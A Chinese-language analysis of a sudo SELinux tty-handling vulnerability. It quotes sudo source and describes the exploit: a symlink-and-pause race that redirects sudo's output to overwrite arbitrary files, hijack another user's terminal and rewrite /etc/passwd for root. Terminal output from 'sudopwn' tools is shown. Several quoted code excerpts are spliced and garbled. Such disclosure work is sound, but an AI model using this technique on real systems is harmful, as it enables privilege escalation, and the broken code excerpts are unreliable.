        /* Try to determine the tty from tty_nr in /proc/pid/stat. */
        snprintf(path, sizeof(path), "/proc/%u/stat", (unsigned int)getpid());
        if ((fp = fopen(path, "r")) != NULL) {
        len = getline(&line, &linesize, fp);
        fclose(fp);
        if (len != -1) {
            /* Field 7 is the tty dev (0 if no tty) */
            char *cp = line;
            char *ep = line;
            const char *errstr;
            int field = 0;
在获取设备号之后，程序会调用sudo_ttyname_dev寻找设备文件。首先会在search_devs列表中的目录下寻找（这里只截取了/dev/pts下搜索的代码），如果该文件为字符设备文件并且设备号是要找的设备号，就返回该文件的路径吧。如果没找到，就调用sudo_ttyname_scan在/dev下进行广度搜索。
        /*
         * First check search_devs for common tty devices.
         */
        for (sd = search_devs; (devname = *sd) != NULL; sd++) {
        len = strlen(devname);
        if (devname[len - 1] == '/') {
            if (strcmp(devname, "/dev/pts/") == 0) {
            /* Special case /dev/pts */
            (void)snprintf(buf, sizeof(buf), "%spts/%u", _PATH_DEV,
                (unsigned int)minor(rdev));
            if (stat(buf, &sb) == 0) {
                if (S_ISCHR(sb.st_mode) && sb.st_rdev == rdev) {
                sudo_debug_printf(SUDO_DEBUG_INFO|SUDO_DEBUG_LINENO,
                    "comparing dev %u to %s: match!",
                    (unsigned int)rdev, buf);
                if (strlcpy(name, buf, namelen) sudo_execute->exec_cmnd->exec_setup->selinux_setup->relabel_tty，在relabel_tty中可能会调用open(ttyn,O_RDWR|O_NONBLOCK)和dup2将stdin,stdout,
and stderr重定向到用户的tty，攻击者可以利用这一点对控制的设备号所对应的目标文件进行未授权读写操作。
        /* Re-open tty to get new label and reset std{in,out,err} */
        close(se_state.ttyfd);
        se_state.ttyfd = open(ttyn, O_RDWR|O_NONBLOCK);
        if (se_state.ttyfd == -1) {
            sudo_warn(U_("unable to open %s"), ttyn);
            goto bad;
        }
        (void)fcntl(se_state.ttyfd, F_SETFL,
            fcntl(se_state.ttyfd, F_GETFL, 0) & ~O_NONBLOCK);
        for (fd = STDIN_FILENO; fd flags, CD_RBAC_ENABLED)) {
        if (selinux_setup(details->selinux_role, details->selinux_type,
            ptyname ? ptyname : user_details.tty, ptyfd) == -1)
            goto done;
        }
    #endif
    #ifdef HAVE_SELINUX
        if (details->selinux_role != NULL && is_selinux_enabled() > 0)
        SET(details->flags, CD_RBAC_ENABLED);
    #endif
## 漏洞利用
先复述一下第一种利用思路吧（这个难一点点），get_process_ttyname函数获取设备号的方式存在漏洞，使得攻击者可控制设备号。程序会通过比对的方式获取与该设备号相对应的设备文件，首先会在内置的
search_devs列表中寻找，如果没找到就会从/dev中寻找。攻击者可以在/dev目录下选择一个可写的文件夹，向其中写入一个指向/dev/pts/num的软连接，要求这个num文件当前不存在，并且要和伪造的设备号相对应，就像前面所说的/dev/pts/0和34816。然后通过带有空格和伪造设备号的软连接启动sudo（要加-r选项，这样才能重定向），程序在/dev/pts下找不到num文件，因而会从/dev下没有被忽略的文件中去找，当程序找到存放链接文件的文件夹时，暂停sudo程序，调用openpty函数不断创建终端，直到出现/dev/pts/num文件，然后继续运行sudo程序，这样程序获取的设备文件就是攻击者伪造的那个软链接。然后在程序关闭文件夹的时候，再次暂停程序，将这个软链接重新指向攻击者想要写入的文件然后运行程序，这样程序以为的tty实际上是攻击者指定的文件，然后程序会通过dup2将stdin,
stdout, and stderr重定向到这个文件。这样我们可以通过控制可用命令的输出或报错信息，从而精准覆写系统上的任意文件。
1、寻找/dev下可写目录，可以找到mqueue/和shm/。在shm/中创建文件夹/_tmp，并在其中设置/dev/shm/_tmp/_tty->/dev/pts/57、/dev/shm/_tmp/
34873 ->/usr/bin/sudo。
    strawberry@ubuntu:/dev$ ll | grep drwxrwx
    drwxrwxrwt   2 root       root          40 Feb 13 18:20 mqueue/
    drwxrwxrwt   3 root       root          60 Feb 13 19:08 shm/
2、sudo -r 选项，ubuntu中的sudo虽内置了这个选项，但没有安装selinux，所以没有测试成功。
     -r role       create SELinux security context with specified role
3、在redhat下测试，sudo -r unconfined_r可以用。执行/dev/shm/_tmp/ 34873 -r unconfined_r
/usr/bin/sum"--\nHELLO\nWORLD\n"，程序会去寻找设备号为34873的设备。
    [testtest@redhat ~]$ id -Z
    unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
    [testtest@redhat ~]$ sudo -r unconfined_r sum test
    00000     0
    [testtest@redhat ~]$ sudo -r asdf sum test
    sudo: unable to get default type for role asdf
4、由于/dev/pts/57不存在，程序在遍历完search_devs列表中的目录后会在/dev下寻找，我们监测/dev/shm/_tmp文件夹是否打开，如果打开了就向sudo进程发送SIGSTOP信号使其暂停，同时调用openpty函数生成/dev/pts/57，如果/dev/pts/57存在了，就向sudo发送SIGCONT信号恢复其运行。
    [+] Create /dev/pts/2
    [+] Create /dev/pts/3
    ...
    [+] Create /dev/pts/57
5、检测到/dev/shm/_tmp文件夹关闭后，暂停sudo程序，修改/dev/shm/_tmp/_tty，使其指向/etc/motd，成功后继续运行程序。
6、为了可以两次成功暂停sudo进程，可以将其优先级设置为19，调用sched_setscheduler为其设置SCHED_IDLE策略，调用sched_setaffinity使sudo进程和利用进程使用相同的CPU，而利用进程的优先级被设置为-20（最高优先级）。
7、最终测试：在sudoers添加testtest ALL=(ALL)
/usr/bin/sum策略，运行sudopwn（将输出/重定向到/etc/motd），可以看出文件中的内容原本为“motd”，运行程序后被覆盖为sum命令的报错信息：
    Last login: Thu Feb 13 15:02:54 2020
    motd
    [testtest@redhat ~]$ ./sudopwn
    [sudo] password for testtest: 
    [testtest@redhat ~]$ cat /etc/motd
    /usr/bin/sum: unrecognized option '--    HELLO
    WORLD
    '
    Try '/usr/bin/sum --help' for more information.
第二种利用思路简单一些，攻击者在登录之后，可进入/dev/pts目录筛选出其它用户登录的设备，计算该设备号，利用此漏洞使用带有此设备号的符号链接来启动sudo程序，根据其授权的命令不同可选择获取对该终端的读写权限。
    [testtest@redhat pts]$ tty
    /dev/pts/1
    [testtest@redhat pts]$ ls
    0  1  2  ptmx
    [testtest@redhat ~]$ ./sudopwn2
    Input pts num: 2
    [sudo] password for testtest: 
    [testtest@redhat ~]$ 
    [strawberry@redhat ~]$ /usr/bin/sum: unrecognized option '--    HELLO
    WORLD
    '
    Try '/usr/bin/sum --help' for more information.
## 漏洞总结
sudo获取设备号的方式存在漏洞，使得攻击者可控制设备号。攻击者可选取一组对应的设备号和设备文件，使用带有伪造设备号的符号链接启动sudo。由于漏洞的存在，程序会读取错误的设备号，并在/dev中寻找相应的设备文件（如果是本身不存在的设备文件，攻击者还需选择合适的时机创建此设备文件，并在另一刻将指向其的符号链接指向目标文件）。当程序运行在启用SELinux的系统上时，如果sudo使用了r选项使用指定role创建SELinux安全上下文，则会将stdin、stdout和stderr重定向到当前设备，这可能允许攻击者对目标设备进行未授权读写。假如攻击者利用该漏洞覆写了/etc/passwd文件，则有可能获取root权限。
    strawberry@ubuntu:~$ ssh PI:EMAIL
    PI:EMAIL's password: 
    Last login: Thu Feb 13 15:02:54 2020
    [testtest@redhat ~]$ whoami
    testtest
    [testtest@redhat ~]$ ./sudopwn 
    [sudo] password for testtest: 
    [testtest@redhat ~]$ whoami
    whoami: cannot find name for user ID 1001
    [testtest@redhat ~]$ logout
    Connection to 192.168.29.173 closed.
    strawberry@ubuntu:~$ ssh PI:EMAIL
    PI:EMAIL's password: 
    Last login: Thu Feb 13 16:29:05 2020 from 192.168.29.155
    [root@redhat ~]# id
    uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
**参考文章**
  1. 
  2. 
  3. 
  4. 
  5. 
* * *